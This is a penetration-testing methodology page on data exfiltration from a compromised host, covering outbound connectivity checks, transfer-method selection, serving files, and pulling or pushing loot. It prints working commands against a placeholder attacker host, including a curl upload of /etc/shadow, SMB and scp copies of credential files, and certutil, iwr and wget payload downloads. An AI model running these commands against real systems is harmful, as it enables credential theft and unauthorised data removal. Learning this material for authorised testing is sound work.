# Data Exfiltration

Data exfiltration covers moving files and loot off a compromised host to your attacker machine. The technique depends on what the target allows outbound — HTTP/S works almost everywhere, but DNS and ICMP-based exfil are fallbacks when everything else is filtered.

---

## Methodology

### 1. Test Outbound Connectivity

Before committing to a transfer method, confirm what's allowed outbound from the target:

```bash
# From target — can it reach you?
curl http://<attacker-ip>/test
ping -c 1 <attacker-ip>
nslookup <attacker-ip>
```

If nothing works, check if a proxy or internal host has outbound access and pivot through it.

---

### 2. Choose a Transfer Method

| Situation | Method |
|---|---|
| HTTP/S allowed outbound | Python HTTP server + `curl`/`wget`/`iwr` |
| SMB allowed | Impacket `smbserver` |
| SSH available | `scp` or `sftp` |
| Only DNS outbound | DNS exfil (`dnscat2`, `iodine`) |
| Fully restricted | Encode data in ICMP or encode to clipboard |

---

### 3. Serve Files from Attacker Machine

```bash
python3 -m http.server 80
python3 -m http.server 443        # pair with an SSL wrapper if needed
impacket-smbserver PWN /home/user/loot -smb2support
```

---

### 4. Pull Files from the Target

**Linux target:**

```bash
wget http://<attacker-ip>/file -O /tmp/file
curl http://<attacker-ip>/file -o /tmp/file
```

**Windows target:**

```powershell
iwr -uri http://<attacker-ip>/file -OutFile C:\Temp\file
certutil -urlcache -split -f http://<attacker-ip>/file C:\Temp\file
```

**Via SMB:**

```powershell
copy \\<attacker-ip>\PWN\file C:\Temp\file
```

See [File Transfer Techniques](file-transfer-techniques.md) for a full reference including base64 encoding and netcat transfers.

---

### 5. Exfiltrate Loot Off the Target

**Push files to attacker machine via curl:**

```bash
curl -F "file=@/etc/shadow" http://<attacker-ip>/upload
```

**Via SMB (Windows → attacker):**

```powershell
copy C:\Temp\loot.txt \\<attacker-ip>\PWN\loot.txt
```

**Via SCP (if SSH is available):**

```bash
scp root@10.10.10.10:/etc/shadow /tmp/shadow
```

See [Secure Transfers](secure-transfers.md) for encrypted channels and covert exfiltration techniques.

!!! tip "Real-world"
    On real engagements, avoid exfiltrating actual client data unless explicitly required to demonstrate impact. Screenshot directory listings or hash files to prove access — exfiltrating real data creates legal and compliance risk.
